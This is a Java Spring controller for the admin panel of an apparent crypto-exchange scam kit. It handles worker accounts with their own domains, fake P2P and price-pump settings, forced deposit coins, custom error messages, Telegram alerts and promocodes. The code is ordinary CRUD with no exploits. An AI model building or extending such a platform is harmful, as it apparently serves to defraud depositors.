package me.yukitale.cryptoexchange.panel.admin.controller.api;

import me.yukitale.cryptoexchange.common.types.CoinType;
import me.yukitale.cryptoexchange.config.Resources;
import me.yukitale.cryptoexchange.exchange.model.Coin;
import me.yukitale.cryptoexchange.exchange.model.ban.EmailBan;
import me.yukitale.cryptoexchange.exchange.model.user.*;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserErrorMessage;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserFeature;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserRequiredDepositCoin;
import me.yukitale.cryptoexchange.exchange.repository.CoinRepository;
import me.yukitale.cryptoexchange.exchange.repository.ban.EmailBanRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.*;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserErrorMessageRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserFeatureRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserRequiredDepositCoinRepository;
import me.yukitale.cryptoexchange.exchange.security.service.UserDetailsServiceImpl;
import me.yukitale.cryptoexchange.exchange.security.xss.XSSUtils;
import me.yukitale.cryptoexchange.exchange.service.CooldownService;
import me.yukitale.cryptoexchange.exchange.service.EmailService;
import me.yukitale.cryptoexchange.exchange.service.UserService;
import me.yukitale.cryptoexchange.exchange.service.WestWalletService;
import me.yukitale.cryptoexchange.panel.admin.model.coins.AdminCoinSettings;
import me.yukitale.cryptoexchange.panel.admin.model.coins.AdminDepositCoin;
import me.yukitale.cryptoexchange.panel.admin.model.other.*;
import me.yukitale.cryptoexchange.panel.admin.model.p2pfake.P2PFake;
import me.yukitale.cryptoexchange.panel.admin.model.payments.PaymentSettings;
import me.yukitale.cryptoexchange.panel.admin.model.telegram.AdminTelegramId;
import me.yukitale.cryptoexchange.panel.admin.model.telegram.AdminTelegramNotification;
import me.yukitale.cryptoexchange.panel.admin.model.telegram.AdminTelegramSettings;
import me.yukitale.cryptoexchange.panel.admin.model.telegram.TelegramMessage;
import me.yukitale.cryptoexchange.panel.admin.repository.coins.AdminCoinSettingsRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.coins.AdminDepositCoinRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.other.*;
import me.yukitale.cryptoexchange.panel.admin.repository.payments.PaymentSettingsRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.telegram.AdminTelegramIdRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.telegram.AdminTelegramNotificationRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.telegram.AdminTelegramSettingsRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.telegram.TelegramMessageRepository;
import me.yukitale.cryptoexchange.panel.admin.service.P2PFakeService;
import me.yukitale.cryptoexchange.panel.common.model.ErrorMessage;
import me.yukitale.cryptoexchange.panel.common.model.SmartDepositStep;
import me.yukitale.cryptoexchange.panel.common.types.HomePageDesign;
import me.yukitale.cryptoexchange.panel.common.types.KycAcceptTimer;
import me.yukitale.cryptoexchange.panel.supporter.model.Supporter;
import me.yukitale.cryptoexchange.panel.supporter.repository.SupporterRepository;
import me.yukitale.cryptoexchange.panel.supporter.service.SupporterService;
import me.yukitale.cryptoexchange.panel.worker.model.Domain;
import me.yukitale.cryptoexchange.panel.worker.model.Promocode;
import me.yukitale.cryptoexchange.panel.worker.model.Worker;
import me.yukitale.cryptoexchange.panel.worker.model.settings.coins.WorkerDepositCoin;
import me.yukitale.cryptoexchange.panel.worker.repository.*;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.coins.WithdrawCoinLimitRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.coins.WorkerDepositCoinRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.other.WorkerSettingsRepository;
import me.yukitale.cryptoexchange.panel.worker.service.DomainService;
import me.yukitale.cryptoexchange.panel.worker.service.WorkerService;
import me.yukitale.cryptoexchange.utils.DataValidator;
import me.yukitale.cryptoexchange.utils.FileUploadUtil;
import me.yukitale.cryptoexchange.utils.JsonUtil;
import org.apache.commons.lang.StringUtils;
import org.owasp.html.HtmlPolicyBuilder;
import org.owasp.html.PolicyFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.IOException;
import java.time.Duration;
import java.util.*;

@RestController
@RequestMapping(value = "/api/admin-panel")
@PreAuthorize("hasRole('ROLE_ADMIN')")
public class AdminPanelApiController {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private WorkerRepository workerRepository;

    @Autowired
    private SupporterRepository supporterRepository;

    @Autowired
    private DomainRepository domainRepository;

    @Autowired
    private PaymentSettingsRepository paymentSettingsRepository;

    @Autowired
    private AdminTelegramSettingsRepository adminTelegramSettingsRepository;

    @Autowired
    private AdminTelegramNotificationRepository adminTelegramNotificationRepository;

    @Autowired
    private AdminTelegramIdRepository adminTelegramIdRepository;

    @Autowired
    private TelegramMessageRepository telegramMessageRepository;

    @Autowired
    private AdminSettingsRepository adminSettingsRepository;

    @Autowired
    private AdminEmailSettingsRepository adminEmailSettingsRepository;

    @Autowired
    private AdminStakingPlanRepository adminStakingPlanRepository;

    @Autowired
    private AdminSupportPresetRepository adminSupportPresetRepository;

    @Autowired
    private AdminFeatureRepository adminFeatureRepository;

    @Autowired
    private AdminErrorMessageRepository adminErrorMessageRepository;

    @Autowired
    private AdminLegalSettingsRepository adminLegalSettingsRepository;

    @Autowired
    private AdminDepositCoinRepository adminDepositCoinRepository;

    @Autowired
    private AdminCoinSettingsRepository adminCoinSettingsRepository;

    @Autowired
    private AdminSmartDepositStepRepository adminSmartDepositStepRepository;

    @Autowired
    private CoinRepository coinRepository;

    @Autowired
    private UserWalletConnectRepository userWalletConnectRepository;

    @Autowired
    private UserSupportMessageRepository userSupportMessageRepository;

    @Autowired
    private UserSupportDialogRepository userSupportDialogRepository;

    @Autowired
    private FastPumpRepository fastPumpRepository;

    @Autowired
    private StablePumpRepository stablePumpRepository;

    @Autowired
    private PromocodeRepository promocodeRepository;

    @Autowired
    private UserStakingRepository userStakingRepository;

    @Autowired
    private UserBalanceRepository userBalanceRepository;

    @Autowired
    private UserAlertRepository userAlertRepository;

    @Autowired
    private UserFeatureRepository userFeatureRepository;

    @Autowired
    private UserTransactionRepository userTransactionRepository;

    @Autowired
    private UserKycRepository userKycRepository;

    @Autowired
    private UserDepositRepository userDepositRepository;

    @Autowired
    private UserRequiredDepositCoinRepository userRequiredDepositCoinRepository;

    @Autowired
    private UserErrorMessageRepository userErrorMessageRepository;

    @Autowired
    private EmailBanRepository emailBanRepository;

    @Autowired
    private WorkerSettingsRepository workerSettingsRepository;

    @Autowired
    private WithdrawCoinLimitRepository withdrawCoinLimitRepository;

    @Autowired
    private WorkerDepositCoinRepository workerDepositCoinRepository;

    @Autowired
    private WorkerService workerService;

    @Autowired
    private SupporterService supporterService;

    @Autowired
    private UserService userService;

    @Autowired
    private WestWalletService westWalletService;

    @Autowired
    private UserAddressRepository userAddressRepository;

    @Autowired
    private DomainService domainService;

    @Autowired
    private P2PFakeService p2PFakeService;

    @Autowired
    private CooldownService cooldownService;

    @Autowired
    private EmailService emailService;

    @Autowired
    private UserDetailsServiceImpl userDetailsService;

    //start workers
    @PostMapping(value = "/workers")
    public ResponseEntity<String> workersController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "ADD_WORKER" -> {
                return addWorker(data);
            }
            case "DELETE_WORKER" -> {
                return deleteWorker(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> addWorker(Map<String, Object> data) {
        String email = ((String) data.get("email")).toLowerCase();
        if (!userRepository.existsByEmail(email.toLowerCase())) {
            return ResponseEntity.badRequest().body("email_not_found");
        }

        User user = userRepository.findByEmail(email).orElseThrow();
        if (user.isStaff()) {
            return ResponseEntity.badRequest().body("already_exists");
        }

        workerService.createWorker(user);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteWorker(Map<String, Object> data) {
        long workerId = Long.valueOf((int) data.get("worker_id"));
        if (!workerRepository.existsById(workerId)) {
            return ResponseEntity.badRequest().body("not_found");
        }

        Worker worker = workerRepository.findById(workerId).orElseThrow();

        workerService.deleteWorker(worker);

        return ResponseEntity.ok("success");
    }

    //end workers

    //start supporters
    @PostMapping(value = "/supporters")
    public ResponseEntity<String> supportersController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "ADD_SUPPORTER" -> {
                return addSupporter(data);
            }
            case "DELETE_SUPPORTER" -> {
                return deleteSupporter(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> addSupporter(Map<String, Object> data) {
        String email = ((String) data.get("email")).toLowerCase();
        if (!userRepository.existsByEmail(email.toLowerCase())) {
            return ResponseEntity.badRequest().body("email_not_found");
        }

        User user = userRepository.findByEmail(email).orElseThrow();
        if (user.isStaff()) {
            return ResponseEntity.badRequest().body("already_exists");
        }

        supporterService.createSupporter(user);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteSupporter(Map<String, Object> data) {
        long supporterId = Long.valueOf((int) data.get("supporter_id"));
        if (!supporterRepository.existsById(supporterId)) {
            return ResponseEntity.badRequest().body("not_found");
        }

        Supporter supporter = supporterRepository.findById(supporterId).orElseThrow();

        supporterService.deleteSupporter(supporter);

        return ResponseEntity.ok("success");
    }
    //end supporters

    //start domains
    @PostMapping(value = "/domains")
    public ResponseEntity<String> domainsController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "ADD_DOMAIN" -> {
                return addDomain(data);
            }
            case "ADD_ADMIN_DOMAIN" -> {
                return addAdminDomain(data);
            }
            case "DELETE_DOMAIN" -> {
                return deleteDomain(data);
            }
            case "GET_DOMAIN" -> {
                return getDomain(data);
            }
            case "GET_EMAIL" -> {
                return getEmail(data);
            }
            case "GET_SOCIAL_NETWORKS" -> {
                return getSocialNetworks(data);
            }
            case "EDIT_SOCIAL_NETWORKS" -> {
                return editDomainSocialNetworks(data);
            }
            case "EDIT_EMAIL" -> {
                return editEmail(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> addDomain(Map<String, Object> data) {
        String email = (String) data.get("worker");
        User user = userRepository.findByEmail(email.toLowerCase()).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("worker_not_found");
        }

        Worker worker = workerRepository.findByUserId(user.getId()).orElse(null);
        if (worker == null) {
            return ResponseEntity.badRequest().body("worker_not_found");
        }

        String domain = ((String) data.get("domain")).toLowerCase();
        if (domainRepository.existsByName(domain)) {
            return ResponseEntity.badRequest().body("already_exists");
        }

        if (!DataValidator.isDomainValided(domain)) {
            return ResponseEntity.badRequest().body("bad_domain");
        }

        AdminSettings adminSettings = adminSettingsRepository.findFirst();
        String exchangeName = adminSettings.getSiteName();
        String title = adminSettings.getSiteTitle();
        String icon = adminSettings.getSiteIcon();

        domainService.createDomain(worker, domain, exchangeName, title, icon);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> addAdminDomain(Map<String, Object> data) {
        String domain = ((String) data.get("domain")).toLowerCase();
        if (domainRepository.existsByName(domain)) {
            return ResponseEntity.badRequest().body("already_exists");
        }

        if (!DataValidator.isDomainValided(domain)) {
            return ResponseEntity.badRequest().body("bad_domain");
        }

        AdminSettings adminSettings = adminSettingsRepository.findFirst();
        String exchangeName = adminSettings.getSiteName();
        String title = adminSettings.getSiteTitle();
        String icon = adminSettings.getSiteIcon();

        domainService.createDomain(null, domain, exchangeName, title, icon);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteDomain(Map<String, Object> data) {
        long domainId = (long) (int) data.get("domain_id");
        if (!domainRepository.existsById(domainId)) {
            return ResponseEntity.badRequest().body("domain_not_found");
        }

        domainRepository.deleteById(domainId);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> getDomain(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Optional<Domain> domainOptional = domainRepository.findById(id);
        if (domainOptional.isEmpty()) {
            return ResponseEntity.badRequest().body("not_found");
        }

        Domain domain = domainOptional.get();

        Map<String, String> map = new HashMap<>() {{
            put("name", domain.getName());
            put("exchange_name", domain.getExchangeName());
            put("icon", domain.getIcon());
            put("title", domain.getTitle());
            put("home_page", String.valueOf(domain.getNewHomePageDesign().ordinal()));
        }};

        return ResponseEntity.ok(JsonUtil.writeJson(map));
    }

    private ResponseEntity<String> getEmail(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Optional<Domain> domainOptional = domainRepository.findById(id);
        if (domainOptional.isEmpty()) {
            return ResponseEntity.badRequest().body("not_found");
        }

        Domain domain = domainOptional.get();

        Map<String, Object> map = new HashMap<>() {{
            put("enabled", domain.isEmailEnabled());
            put("required", domain.isEmailRequiredEnabled());
            put("server", domain.getServer());
            put("port", domain.getPort());
            put("email", domain.getEmail());
            put("password", domain.getPassword());
        }};

        return ResponseEntity.ok(JsonUtil.writeJson(map));
    }

    private ResponseEntity<String> getSocialNetworks(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Optional<Domain> domainOptional = domainRepository.findById(id);
        if (domainOptional.isEmpty()) {
            return ResponseEntity.badRequest().body("not_found");
        }

        Domain domain = domainOptional.get();

        Map<String, Object> map = new HashMap<>() {{
            put("listing_request", domain.getListingRequest());
            put("partnership", domain.getPartnership());
            put("twitter", domain.getTwitter());
            put("telegram", domain.getTelegram());
            put("instagram", domain.getInstagram());
            put("facebook", domain.getFacebook());
            put("reddit", domain.getReddit());

            put("listing_request_enabled", domain.isListingRequestEnabled());
            put("partnership_enabled", domain.isPartnershipEnabled());
            put("twitter_enabled", domain.isTwitterEnabled());
            put("telegram_enabled", domain.isTelegramEnabled());
            put("instagram_enabled", domain.isInstagramEnabled());
            put("facebook_enabled", domain.isFacebookEnabled());
            put("reddit_enabled", domain.isRedditEnabled());
        }};

        return ResponseEntity.ok(JsonUtil.writeJson(map));
    }

    private ResponseEntity<String> editEmail(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Optional<Domain> domainOptional = domainRepository.findById(id);
        if (domainOptional.isEmpty()) {
            return ResponseEntity.badRequest().body("not_found");
        }

        Domain domain = domainOptional.get();

        boolean enabled = (boolean) data.get("enabled");
        boolean required = (boolean) data.get("required");

        String server = (String) data.get("server");
        if (enabled && !DataValidator.isDomainValided(server.toLowerCase())) {
            return ResponseEntity.badRequest().body("invalid_server");
        }
        int port = Integer.parseInt(String.valueOf(data.get("port")));
        if (enabled && port <= 0 || port > 65535) {
            return ResponseEntity.badRequest().body("invalid_port");
        }

        String email = String.valueOf(data.get("email")).toLowerCase();
        if (enabled && !DataValidator.isEmailValided(email)) {
            return ResponseEntity.badRequest().body("invalid_email");
        }

        String password = String.valueOf(data.get("password"));

        boolean validate = (!domain.isEmailEnabled() && enabled) || (enabled && (!domain.getServer().equals(server) || domain.getPort() != port || !domain.getEmail().equals(email) || !domain.getPassword().equals(password)));
        if (validate && !emailService.validateEmail(server, port, email, password)) {
            return ResponseEntity.badRequest().body("connection_error");
        }

        domain.setEmailEnabled(enabled);
        domain.setEmailRequiredEnabled(required);
        domain.setServer(server);
        domain.setPort(port);
        domain.setEmail(email);
        domain.setPassword(password);

        domainRepository.save(domain);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editDomainSocialNetworks(Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Optional<Domain> domainOptional = domainRepository.findById(id);
        if (domainOptional.isEmpty()) {
            return ResponseEntity.badRequest().body("not_found");
        }

        Domain domain = domainOptional.get();

        String listingRequest = String.valueOf(data.get("listing_request"));
        String partnership = String.valueOf(data.get("partnership"));
        String twitter = String.valueOf(data.get("twitter"));
        String telegram = String.valueOf(data.get("telegram"));
        String instagram = String.valueOf(data.get("instagram"));
        String facebook = String.valueOf(data.get("facebook"));
        String reddit = String.valueOf(data.get("reddit"));

        boolean listingRequestEnabled = (boolean) data.get("listing_request_enabled");
        boolean partnershipEnabled = (boolean) data.get("partnership_enabled");
        boolean twitterEnabled = (boolean) data.get("twitter_enabled");
        boolean telegramEnabled = (boolean) data.get("telegram_enabled");
        boolean instagramEnabled = (boolean) data.get("instagram_enabled");
        boolean facebookEnabled = (boolean) data.get("facebook_enabled");
        boolean redditEnabled = (boolean) data.get("reddit_enabled");

        domain.setListingRequest(listingRequest);
        domain.setPartnership(partnership);
        domain.setTwitter(twitter);
        domain.setTelegram(telegram);
        domain.setInstagram(instagram);
        domain.setFacebook(facebook);
        domain.setReddit(reddit);

        domain.setListingRequestEnabled(listingRequestEnabled);
        domain.setPartnershipEnabled(partnershipEnabled);
        domain.setTwitterEnabled(twitterEnabled);
        domain.setTelegramEnabled(telegramEnabled);
        domain.setInstagramEnabled(instagramEnabled);
        domain.setFacebookEnabled(facebookEnabled);
        domain.setRedditEnabled(redditEnabled);

        domainRepository.save(domain);

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "domains/edit")
    public ResponseEntity<String> domainsEditController(@RequestParam(value = "id") long id, @RequestParam("exchangeName") String exchangeName, @RequestParam(value = "title") String title, @RequestParam(value = "homePage") String homePage, @RequestParam(value = "icon", required = false) MultipartFile image) {
        if (!DataValidator.isTextValidedLowest(exchangeName.toLowerCase()) || !DataValidator.isTextValidedLowest(title.toLowerCase())) {
            return ResponseEntity.badRequest().body("name_title_error");
        }

        Optional<Domain> domainOptional = domainRepository.findById(id);
        if (domainOptional.isEmpty()) {
            return ResponseEntity.badRequest().body("not_found");
        }

        int homePageId = 0;
        try {
            homePageId = Integer.parseInt(homePage);
        } catch (Exception ex) {}

        if (homePageId < 0 || homePageId >= HomePageDesign.values().length) {
            return ResponseEntity.badRequest().body("error");
        }

        HomePageDesign homePageDesign = HomePageDesign.values()[homePageId];

        Domain domain = domainOptional.get();
        domain.setExchangeName(exchangeName);
        domain.setTitle(title);
        domain.setHomeDesign(homePageDesign.ordinal());

        if (image != null && image.getOriginalFilename() != null) {
            try {
                String fileName = domain.getId() + "_" + System.currentTimeMillis() + ".png";
                FileUploadUtil.saveFile(Resources.DOMAIN_ICONS_DIR, fileName, image);
                domain.setIcon("../" + Resources.DOMAIN_ICONS_DIR + "/" + fileName);
            } catch (IOException e) {
                e.printStackTrace();
                return ResponseEntity.badRequest().body("upload_image_error");
            }
        }

        domainRepository.save(domain);

        return ResponseEntity.ok("success");
    }
    //end domains

    //start payments
    @PostMapping(value = "/payments")
    public ResponseEntity<String> paymentsController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_TRANSAK_SETTINGS" -> {
                return editTransakSettings(data);
            }
            case "EDIT_DEPOSIT_SETTINGS" -> {
                return editDepositSettings(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    public ResponseEntity<String> editTransakSettings(Map<String, Object> data) {
        /*String key = (String) data.get("key");
        if (key.length() < 10) {
            return ResponseEntity.badRequest().body("error");
        }*/

        boolean enabled = (boolean) data.get("enabled");

        PaymentSettings paymentSettings = paymentSettingsRepository.findFirst();

        //paymentSettings.setTransakApiKey(key);
        paymentSettings.setTransakEnabled(enabled);

        paymentSettingsRepository.save(paymentSettings);

        return ResponseEntity.ok("success");
    }

    public ResponseEntity<String> editDepositSettings(Map<String, Object> data) {
        String publicKey = (String) data.get("public_key");
        String privateKey = (String) data.get("private_key");
        if (publicKey.length() < 10 || privateKey.length() < 10) {
            return ResponseEntity.badRequest().body("error");
        }

        PaymentSettings paymentSettings = paymentSettingsRepository.findFirst();

        paymentSettings.setWestWalletPublicKey(publicKey);
        paymentSettings.setWestWalletPrivateKey(privateKey);

        paymentSettingsRepository.save(paymentSettings);

        return ResponseEntity.ok("success");
    }
    //end payments

    //start telegram
    @PostMapping(value = "/telegram")
    public ResponseEntity<String> telegramController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_BOT_SETTINGS" -> {
                return editBotSettings(data);
            }
            case "EDIT_CHANNEL_SETTINGS" -> {
                return editChannelSettings(data);
            }
            case "ADD_TELEGRAM_ID" -> {
                return addTelegramId(data);
            }
            case "DELETE_TELEGRAM_ID" -> {
                return deleteTelegramId(data);
            }
            case "EDIT_NOTIFICATIONS" -> {
                return editTelegramNotifications(data);
            }
            case "EDIT_MESSAGES" -> {
                return editTelegramMessages(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editBotSettings(Map<String, Object> data) {
        String botUsername = (String) data.get("username");
        if (botUsername.length() < 6 || !botUsername.startsWith("@")) {
            return ResponseEntity.badRequest().body("username_error");
        }

        String botToken = (String) data.get("token");
        if (botToken.length() < 40 || !botToken.contains(":")) {
            return ResponseEntity.badRequest().body("token_error");
        }

        AdminTelegramSettings telegramSettings = adminTelegramSettingsRepository.findFirst();

        telegramSettings.setBotUsername(botUsername);
        telegramSettings.setBotToken(botToken);

        adminTelegramSettingsRepository.save(telegramSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editChannelSettings(Map<String, Object> data) {
        boolean enabled = Boolean.parseBoolean(String.valueOf(data.get("enabled")));

        long channelId = -1;
        try {
            if (enabled) {
                channelId = Long.parseLong(String.valueOf(data.get("id")));
            }
        } catch (Exception ex) {
            return ResponseEntity.badRequest().body("channel_id_error");
        }

        String message = String.valueOf(data.get("message"));
        if (StringUtils.isBlank(message)) {
            return ResponseEntity.badRequest().body("error");
        }

        AdminTelegramSettings telegramSettings = adminTelegramSettingsRepository.findFirst();

        telegramSettings.setChannelNotification(enabled);
        telegramSettings.setChannelId(channelId);
        telegramSettings.setChannelMessage(message);

        adminTelegramSettingsRepository.save(telegramSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> addTelegramId(Map<String, Object> data) {
        String idLine = String.valueOf(data.get("id"));
        long id = 0;
        try {
            id = Long.parseLong(idLine);
        } catch (Exception ex) {
            return ResponseEntity.badRequest().body("id_error");
        }

        if (id == 0) {
            return ResponseEntity.badRequest().body("id_error");
        }

        if (adminTelegramIdRepository.existsByTelegramId(id)) {
            return ResponseEntity.badRequest().body("already_exists");
        }

        AdminTelegramId adminTelegramId = new AdminTelegramId();
        adminTelegramId.setTelegramId(id);

        adminTelegramIdRepository.save(adminTelegramId);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteTelegramId(Map<String, Object> data) {
        long id = (long) (int) data.get("id");

        if (!adminTelegramIdRepository.existsById(id)) {
            return ResponseEntity.badRequest().body("not_found");
        }

        adminTelegramIdRepository.deleteById(id);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editTelegramNotifications(Map<String, Object> data) {
        Map<String, Object> notifications = (Map<String, Object>) data.get("notifications");

        for (Map.Entry<String, Object> entry : notifications.entrySet()) {
            AdminTelegramNotification.Type type = Arrays.stream(AdminTelegramNotification.Type.values())
                    .filter(notificationType -> notificationType.name().equals(entry.getKey()))
                    .findFirst()
                    .orElse(null);
            if (type == null) {
                continue;
            }

            AdminTelegramNotification telegramNotification = adminTelegramNotificationRepository.findByType(type).orElse(null);
            if (telegramNotification == null) {
                continue;
            }

            telegramNotification.setEnabled((Boolean) entry.getValue());

            adminTelegramNotificationRepository.save(telegramNotification);
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editTelegramMessages(Map<String, Object> data) {
        Map<String, String> messages = (Map<String, String>) data.get("messages");

        for (Map.Entry<String, String> entry : messages.entrySet()) {
            TelegramMessage.MessageType type = Arrays.stream(TelegramMessage.MessageType.values())
                    .filter(messageType -> messageType.name().equals(entry.getKey()))
                    .findFirst()
                    .orElse(null);
            if (type == null) {
                continue;
            }

            TelegramMessage telegramMessage = telegramMessageRepository.findByType(type).orElse(null);
            if (telegramMessage == null) {
                continue;
            }

            telegramMessage.setMessage(entry.getValue());

            telegramMessageRepository.save(telegramMessage);
        }

        return ResponseEntity.ok("success");
    }
    //end telegram

    //start promocodes
    @PostMapping(value = "/promocodes")
    public ResponseEntity<String> promocodesController(@RequestBody Map<String, Object> data) {
        if (!data.containsKey("action")) {
            return ResponseEntity.badRequest().body("invalid_action");
        }
        String action = (String) data.get("action");
        switch (action) {
            case "ADD_PROMOCODE" -> {
                return addPromocode(data);
            }
            case "DELETE_PROMOCODE" -> {
                return deletePromocode(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> addPromocode(Map<String, Object> data) {
        String name = (String) data.get("promocode");
        if (!name.matches("^[a-zA-Z0-9-_]{2,32}$")) {
            return ResponseEntity.badRequest().body("invalid_promocode");
        }
        if (promocodeRepository.existsByNameIgnoreCase(name.toLowerCase())) {
            return ResponseEntity.badRequest().body("promocode_already_exists");
        }

        String symbol = (String) data.get("symbol");
        Optional<Coin> coinOptional = coinRepository.findBySymbol(symbol);
        if (coinOptional.isEmpty()) {
            return ResponseEntity.badRequest().body("symbol_not_found");
        }
        String text = (String) data.get("text");
        if (!DataValidator.isTextValided(text) || text.length() > 512) {
            return ResponseEntity.badRequest().body("invalid_text");
        }

        double minAmount = data.get("amount").equals("false") || ((String) data.get("amount")).isEmpty() ? 0D : Double.parseDouble((String) data.get("amount"));
        double maxAmount = data.get("amount_2").equals("false") || ((String) data.get("amount_2")).isEmpty() ? minAmount : Double.parseDouble((String) data.get("amount_2"));
        double bonus = data.get("bonus").equals("false") || ((String) data.get("bonus")).isEmpty() ? 0D : Double.parseDouble((String) data.get("bonus"));

        if (minAmount <= 0 && maxAmount <= 0 && bonus <= 0) {
            return ResponseEntity.badRequest().body("invalid_amount");
        }

        if (minAmount > maxAmount) {
            return ResponseEntity.badRequest().body("invalid_min_amount");
        }

        Promocode promocode = new Promocode(name, text, coinOptional.get(), minAmount, maxAmount, bonus, null);
        promocodeRepository.save(promocode);

        return ResponseEntity.ok("success");
    }

    public ResponseEntity<String> deletePromocode(Map<String, Object> data) {
        long id = (long) (Integer) data.get("promocode_id");
        if (!promocodeRepository.existsById(id)) {
            return ResponseEntity.badRequest().body("not_found");
        }

        promocodeRepository.deleteById(id);

        return ResponseEntity.ok("success");
    }
    //end promocodes

    //start main settings
    @PostMapping(value = "settings/site")
    public ResponseEntity<String> settingsSiteController(@RequestParam("siteName") String name, @RequestParam(value = "siteTitle") String title, @RequestParam(value = "siteHomePage") String homePage, @RequestParam(value = "siteIcon", required = false) MultipartFile image) {
        if (StringUtils.isBlank(name) || StringUtils.isBlank(title) || StringUtils.isBlank(homePage)) {
            return ResponseEntity.badRequest().body("name_title_error");
        }

        int homePageId = 0;
        try {
            homePageId = Integer.parseInt(homePage);
        } catch (Exception ex) {}

        if (homePageId < 0 || homePageId >= HomePageDesign.values().length) {
            return ResponseEntity.badRequest().body("error");
        }

        HomePageDesign homePageDesign = HomePageDesign.values()[homePageId];

        AdminSettings adminSettings = adminSettingsRepository.findFirst();

        adminSettings.setSiteName(name);
        adminSettings.setSiteTitle(title);
        adminSettings.setHomeDesign(homePageDesign.ordinal());

        if (image != null && image.getOriginalFilename() != null) {
            String fileName = System.currentTimeMillis() + "_" + org.springframework.util.StringUtils.cleanPath(image.getOriginalFilename());
            try {
                FileUploadUtil.saveFile(Resources.ADMIN_ICON_DIR, fileName, image);
                adminSettings.setSiteIcon("../" + Resources.ADMIN_ICON_DIR + "/" + fileName);
            } catch (IOException e) {
                e.printStackTrace();
                return ResponseEntity.badRequest().body("upload_image_error");
            }
        }

        adminSettingsRepository.save(adminSettings);

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "/settings")
    public ResponseEntity<String> settingsController(@RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_SUPPORT_SETTINGS" -> {
                return editSupportSettings(data);
            }
            case "EDIT_KYC_ACCEPT" -> {
                return editKycAccept(data);
            }
            case "EDIT_PROMO_SETTINGS" -> {
                return editPromoSettings(data);
            }
            case "EDIT_DEPOSIT_PAGE_SETTINGS" -> {
                return editDepositPageSettings(data);
            }
            case "EDIT_WORKER_PANEL" -> {
                return editWorkerPanel(data);
            }
            case "ADD_STAKING_PLAN" -> {
                return addStakingPlan(data);
            }
            case "DELETE_STAKING_PLAN" -> {
                return deleteStakingPlan(data);
            }
            case "EDIT_FEATURES" -> {
                return editFeatures(data);
            }
            case "EDIT_EMAIL_SETTINGS" -> {
                return editEmailSettings(data);
            }
            case "EDIT_SOCIAL_NETWORKS" -> {
                return editSocialNetworks(data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editSupportSettings(Map<String, Object> data) {
        String message = (String) data.get("message");
        boolean enabled = (boolean) data.get("enabled");
        if (enabled && StringUtils.isBlank(message)) {
            return ResponseEntity.badRequest().body("message_is_empty");
        }

        AdminSettings adminSettings = adminSettingsRepository.findFirst();

        adminSettings.setSupportWelcomeMessage(XSSUtils.stripXSS(message));
        adminSettings.setSupportWelcomeEnabled(enabled);

        adminSettingsRepository.save(adminSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editSocialNetworks(Map<String, Object> data) {
        String listingRequest = String.valueOf(data.get("listing_request"));
        String partnership = String.valueOf(data.get("partnership"));
        String twitter = String.valueOf(data.get("twitter"));
        String telegram = String.valueOf(data.get("telegram"));
        String instagram = String.valueOf(data.get("instagram"));
